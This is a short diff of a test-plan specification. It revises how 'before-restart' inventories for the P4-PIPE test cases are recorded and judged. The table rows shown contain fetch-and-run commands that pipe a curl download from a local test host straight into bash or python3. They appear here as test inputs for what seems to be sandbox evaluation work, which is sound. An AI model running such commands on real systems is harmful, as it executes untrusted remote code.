@@ -284,8 +284,10 @@ whether it is code (R1).
 | P4-PIPE-2 | same | `U: bash <(curl -fsS http://10.0.2.2:PORT/payload.sh)`; as P4-PIPE-1 | same | same |
 | P4-PIPE-3 | same | `U: python3 -c "$(curl -fsS http://10.0.2.2:PORT/payload.py)"` (the same effects from Python) | same | same |
 
-For P4-PIPE-*, `P1:P4-PIPE-n-before` is also written (Q4: the harder reading counts what the code left in force
-before the restart under P1).
+For P4-PIPE-*, the inventory `P4-PIPE-n-before` is taken and compared as every other inventory, and its comparisons
+are kept in the evidence as `P1:P4-PIPE-n-before.record.txt` and `UND:P4-PIPE-n-before.record.txt`; they are records,
+not rows (review R6: the case is judged after the restart). Up to the fourth freeze they were rows `P1:` and `UND:`,
+`undecided` by Q4 (corrections [f5-c]).
 
 ## Removal (REM)
 
